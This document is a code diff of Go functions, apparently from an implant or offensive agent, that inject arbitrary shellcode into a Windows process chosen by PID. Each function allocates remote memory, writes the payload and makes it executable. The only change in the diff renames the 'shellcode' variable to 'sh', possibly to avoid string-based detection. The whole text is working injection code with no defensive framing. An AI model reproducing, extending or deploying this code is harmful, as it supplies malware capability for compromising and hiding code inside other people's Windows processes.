@@ -16,10 +16,10 @@ import (
 
 func InjectProcess(b []byte) ([]byte, error) {
 	pid := ReadInt(b)
-	shellcode := b[8:]
+	sh := b[8:]
 
 	if os.Getpid() == int(pid) {
-		return InjectSelf(shellcode)
+		return InjectSelf(sh)
 	}
 
 	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
@@ -27,14 +27,14 @@ func InjectProcess(b []byte) ([]byte, error) {
 		fmt.Println(err)
 		return nil, err
 	}
-	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
 		fmt.Println("VirtualAlloc Failed")
 		return nil, errors.New("VirtualAlloc Failed")
 	} else {
 		fmt.Println("Alloc: Success")
 	}
-	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
 	if errWriteMemory.Error() != "The operation completed successfully." {
 		fmt.Println("WriteMemory: Failed")
 		return nil, errWriteMemory
@@ -42,7 +42,7 @@ func InjectProcess(b []byte) ([]byte, error) {
 		fmt.Println("WriteMemory: Success")
 	}
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtect.Error() != "The operation completed successfully." {
 		fmt.Println("VirtualProtect: Failed")
 		return nil, errVirtualProtect
@@ -103,10 +103,10 @@ func InjectProcess(b []byte) ([]byte, error) {
 
 func InjectProcessRemote(b []byte) ([]byte, error) {
 	pid := ReadInt(b)
-	shellcode := b[8:]
+	sh := b[8:]
 
 	if os.Getpid() == int(pid) {
-		return InjectSelf(shellcode)
+		return InjectSelf(sh)
 	}
 
 	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
@@ -114,14 +114,14 @@ func InjectProcessRemote(b []byte) ([]byte, error) {
 		fmt.Println(err)
 		return nil, err
 	}
-	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
 		fmt.Println("VirtualAlloc Failed")
 		return nil, errors.New("VirtualAlloc Failed")
 	} else {
 		fmt.Println("Alloc: Success")
 	}
-	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
 	if errWriteMemory.Error() != "The operation completed successfully." {
 		fmt.Println("WriteMemory: Failed")
 		return nil, errWriteMemory
@@ -129,7 +129,7 @@ func InjectProcessRemote(b []byte) ([]byte, error) {
 		fmt.Println("WriteMemory: Success")
 	}
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtect.Error() != "The operation completed successfully." {
 		fmt.Println("VirtualProtect: Failed")
 		return nil, errVirtualProtect
